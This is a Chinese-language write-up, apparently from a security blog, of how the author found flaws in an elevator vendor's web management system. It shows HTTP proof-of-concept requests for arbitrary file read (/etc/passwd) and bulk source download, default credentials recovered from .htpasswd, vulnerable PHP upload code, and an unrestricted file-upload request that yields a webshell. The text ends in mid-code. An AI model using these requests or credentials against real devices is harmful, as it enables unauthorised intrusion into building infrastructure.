记⼀次某电梯Web系统⿊盒到PHP⽩盒挖掘RCE的过程 
概述： 
闲来⽆事，感觉IOT的洞挺好挖，记⼀次针对某电梯的Web系统挖掘到的⼏个任意
⽂件上传跟命令注⼊的过程，算是对PHP代码审计学习的⼀个记录。)
前置知识： 
PHP执⾏命令函数：)
1、shell_exec())
string)shell_exec)()string)$cmd)))执⾏命令，并将结果作为字符串返回。)
返回值：如果执⾏失败，则返回NULL。执⾏成功则返回执⾏结果字符串。)
注意：This)function)is)disabled)when)PHP)is)running)in)safe)mode)
2、passthru())
void)passthru)()string)$command)[,)int)&$return_var)])))
没有返回值，函数直接将执⾏结果返回给浏览器。函数第⼆个参数就是执⾏状态
码：返回0表⽰成功，返回1表⽰失败。)
3、exec())
string)exec(string)command,)string)[array],)int)[return_var]);)
command)–)需要执⾏的命令)
array)–)是输出值填充的数组(每⼀⾏作为数组的⼀项))
return_var–是返回值0或1，如果返回0则执⾏成功，返回1则执⾏失败。)
执⾏不成功时的⽅案：⼀个技巧就是使⽤管道命令,)使⽤)2>&1,)命令就会输出shell
执⾏时的错误到$output变量,)输出该变量即可分析。)
如：exec(‘convert)a.jpg)b.jpg’,)$output,)$return_val);改为：exec(‘convert)a.jpg)b.jpg)
2>&1’,)$output,)$return_val);)print_r($output);)
4、system())
string)system)()string)$command)[,)int)&$return_var)])))
return_var):命令执⾏状态码。返回0表⽰成功，返回1表⽰失败。)
返回值：返回执⾏结果的最后⼀⾏，如果失败返回FALSE.)
⼆、区别)
1、shell_exec())只返回，不输出。)
2、passthru())只输出，不返回，有状态码。)
3、exec())返回最后⼀⾏结果，所有结果可以保存到⼀个返回的数组⾥⾯，有状态
码。)
4、system())输出返回最后⼀⾏结果。)有状态码。)
漏洞分析： 
最早⿊盒发现，存在任意⽂件读取
)
进⾏抓包)
)
篡改成系统其他路径，成功读取系统⽤户。)
POST /app_show_log_lines.php HTTP/1.1)
Host: xxx.xxx.xxx.xxx)
Content-Type: application/x-www-form-urlencoded)
Connection: close)
Content-Length: 25)
)
fileselection=/etc/passwd)
说明存在任意⽂件读取漏洞，这个先暂时记录下来，如果没有其他⿊盒能找到的洞
的话，就直接利⽤这个对页⾯的URI路径全部爬取，进⾏源码读取再审计。)
)
接着发现另外⼀个功能可以任意⽂件全部打包成⼀个zip⽂件提供下载，)
)
以及在页⾯监控中看进程看到了服务器上正在运⾏apache服务，)
)
渗透熟练的⼩伙伴应该知道apache默认⽹站路径是/var/www/html，我们直接尝
试打包这个⽂件夹下来看看源码在不在⾥⾯（如果不在的话，再利⽤上⾯的任意⽂
件读取，fuzz跑⼀下apache的配置⽂件，再通过从配置⽂件中去寻找对应的web路
径。）)
POC：)
POST /app_download_zipped_logs.php HTTP/1.1)
Host: X.X.X.X)
Content-Type: application/x-www-form-urlencoded)
Connection: close)
Content-Length: 34)
)
fileselection[]=/var/www/html/*)
)
成功下载该源码，可以开始⽩盒审计。)
如果代码量⼤的⾮MVC结构的，还是建议扫描器扫⼀遍，个⼈习惯喜欢先看看现有
的功能点全部过⼀遍⼤概⼼⾥有个底，然后每个代码快速阅读，再根据个⼈经验针
对⼤概率出现问题的⼀些功能针对性查看。)
)
访问Con`iguration发现访问了authorization.php那我们本地先从这个⽂件开始看，)
)
从第32⾏看到最后调⽤校验账号密码是/etc/apache2/.htpasswd⽂件，我们利⽤前
⾯的任意⽂件读取即可获得密码。)
)
通过cmd5解密（cmd5打钱），)
kone:gateway)
admin:kone)
成功登录，说明思路没问题。)
)
初步看到功能有配置⽂件上传跟下载配置⽂件，应⽤升级、服务管理、时间服务器
管理、Web密码修改，以及PostgreSQL数据库管理。搞IOT漏洞挖掘熟悉的⼩伙
伴，如果是⿊盒的话，命令注⼊应该会优先看NTP服务器、Ping功能相关，我们切
到⽩盒去查看对应的代码看看有没过滤。)
涉及NTP服务的⽂件有三个change_ntp.php/monitor_ntp.php/change_time.php)
)
第30⾏看到了对应的正则表达式过滤，基本可以放弃了。再看另外⼀个⽂件
monitor_ntp.php。)
)
同样这边也是第17⾏看到这个正则，但后⾯没看到调⽤，继续往下看)
)
这⾥是想看看有没其他能直接get或者post参数进来的变量，50⾏这⾥重置ret变
量，但发现他这个变量是通过ntpq)-np)没加其他变量参数进去获取，没招。喵喵
change_time.php有没洞。)
)
⾸先判断是否登录成功，接着new_time参数是否有输⼊，通过trim移除new_time/
new_date两侧空⽩字符或者其他判断年/⽉/⽇。基本没招，放弃。)
)
接着67⾏到90⾏也是，变量全写死。)
利⽤notepad++搜索ping看看ping功能在哪个⽂件。)
)
)
发现在change_networking.php⽂件当中，先是使⽤validate_ip函数，作为IP地址来
验证，接着使⽤了escapeshellarg函数，php安全中escapeshellarg会过滤掉)arg)中
存在的⼀些特殊字符。在输⼊的参数中如果包含中⽂传递给)，也会被过滤掉。)
常规套路⽆效放弃，转去看upload相关功能。)
)
看到关联的有这些⽂件，这⾥省略找到任意⽂件上传到地⽅，直接看漏洞代码。)
)
)
)
)
)
)
)
)
Failed to locate www document root 
directory. Aborting!";)
return;)
})
)
$package_path = $docRoot."/uploads/bin/";)
$package_file_path=$package_path.basename( $_FILES['uploadedfile'
]['name']); )
$_FILES['uploadedfile']['tmp_name'];)
$return=1;)
echo $package_file_path;)
if (move_uploaded_file($_FILES['uploadedfile']['tmp_name'], 
$package_file_path) && (filesize($package_file_path)>0)) )
{)
if(is_dir($package_path)) )
{)
if(!(opendir($package_path))) )
{)
passthru('unzip $package_file_path');)
if ($return))
{)
$command = "sudo ".$docRoot."/scripts/
install_config.sh";)
echo "Installing...";)
passthru($command);)
echo "installed";)
return;)
})
}   )
})
} )
echo "There was an error reading the files, please try 
again!";)
echo "";
)
})
else )
{)
echo "Authentication Failed!";)
echo "";)
})
?>)
)
)
从第10⾏可以看到有认证，过了认证后，第19⾏到第22⾏，开始对⽂件上传，并
没有做任何后缀跟⽂件类型限制，直接可以上传到⽹站对应根⽬录下的/uploads/
bin⽬录下，也没有做任何重命名。第24⾏到41⾏，判断上传⽂件是否为空⽂件->
判断⽬录是否存在->打不开⽬录的时候开始执⾏unzip命令，但这⾥没看到有任意
⽂件删除，没办法绕过去。)
漏洞利⽤： 
构造任意⽂件上传POC：)
POST /upload_bin_install.php HTTP/1.1)
Host: X.X.X.X)
Content-Type: multipart/form-data; boundary=----
WebKitFormBoundaryAgAiQWYWgJxBjqwA)
Cookie: PHPSESSID=ieu43tab3c7bvnop3v3ome75i6)
Connection: close)
Content-Length: 203)
)
------WebKitFormBoundaryAgAiQWYWgJxBjqwA)
Content-Disposition: form-data; name="uploadedfile"; 
filename="1.php")
Content-Type: text/plain)
)
)
------WebKitFormBoundaryAgAiQWYWgJxBjqwA--)
)
虽然这⾥显⽰读取⽂件错误，但实际上⽂件已经传上去了。我们看⼀下是否解析
了。)
)
成功getshell。)
)
接着⽩盒视⾓回顾⼀下上⾯⼀个任意⽂件读取app_reports_show.php、⼀个任意⽂
件打包app_download_zipped_logs.php。)
app_reports_show.php)
)
)
)
)
)
)
)
)
)
SW Status )
-)
Reports From Applications)
-)
Show Application Report)
)
)
)
Last Log Lines On File "; 
    )
echo $file;)
echo ""; )
)
$line_array=file($file); //or die("Logfile cannot be 
read!");)
for ($index=sizeof($line_array)-200;$index < 
sizeof($line_array);$index++))